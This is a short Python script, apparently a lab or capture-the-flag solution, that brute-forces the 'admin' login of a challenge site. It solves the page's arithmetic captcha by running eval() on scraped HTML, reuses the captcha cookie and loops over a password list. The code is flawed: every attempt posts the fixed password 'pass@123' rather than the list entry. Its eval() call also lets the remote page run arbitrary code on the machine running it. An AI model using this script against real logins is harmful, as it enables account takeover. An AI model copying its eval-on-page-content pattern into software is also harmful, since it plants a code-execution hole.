import requests
import re

url="https://wation.cloud/c/fcda73c5-6f37-4a86-94a0-ecd0d3f7281f?k=ZXlKcGRpSTZJakZZUmk5UGFWaFVTbGRhYWtkalIwa3lUa2xIZFVFOVBTSXNJblpoYkhWbElqb2llV2cxZUc1WWJubG9Wbk5hU25RMlZGbzRkWGRHTkhCbFJYSkxTMnd6ZGtaRk1UTnNhSEV3WlRCc1RqRXlXRXBxUWxsNlFtVTVRMWRSU0RSWlNUZDFjbEJ5TUU1bFVGVnVha1l5ZFhsV2RFeFFka0YyUWxRdksxazVWVTlLZDJ0blVYSTJXamdyV21oYWRqSmlXa04zZHpKUGRXeDVVa1p3ZVVFNWJGcFBiRWw2UW1acGVtNVVWWE5CWVVsUFJGY3ZOVFJ1VHpCalV5dFVUblZMVVhJelFXdE9TMnhSVW5KV2IzYzROVGxHUVVKdmJHRTFUV0pSVGxGRVNrRjNVRmw2Y2pKc0wwRk9XRmRIT0hkbFZIUjZjR2RJY1V4d2VHbDNNSGhYZG5wWGFHbFVTRTB5T1d0VlZVdGhabFp6T0ZweGJXcExZblZMYlhKR1ZVOXRSVWRpWWlJc0ltMWhZeUk2SWpZeE1UQmtaakkxT1dWaU9UUmxPVEkwWlRVME5UWTBNelEyTWpJeVpUZzFPRFZrTlRFMU9XSTVZemMxWTJWbE5HVmtZakJpWVdaaU5HRmhZVGhpT0dFaUxDSjBZV2NpT2lJaWZRPT0"
passlist_file=open("passlist.txt")  
passlist=passlist_file.read().splitlines()
for password in passlist:
    response= requests.get(url)
    pageSourse= response.text
    
    capctchPattern=r'for="captcha".*?>(.*)<\/label>'
    captcha_question= re.findall(capctchPattern,pageSourse)[0]
    print(captcha_question)
    captcha_answer=eval(captcha_question)
    print(captcha_answer)
    
    captch_cookie=response.cookies.get_dict()['captcha']

    print(captch_cookie)

    auth_response=requests.post(url,data={"username":'admin','password':'pass@123','captcha':captcha_answer},cookies={'captcha':captch_cookie})
    print(auth_response.status_code)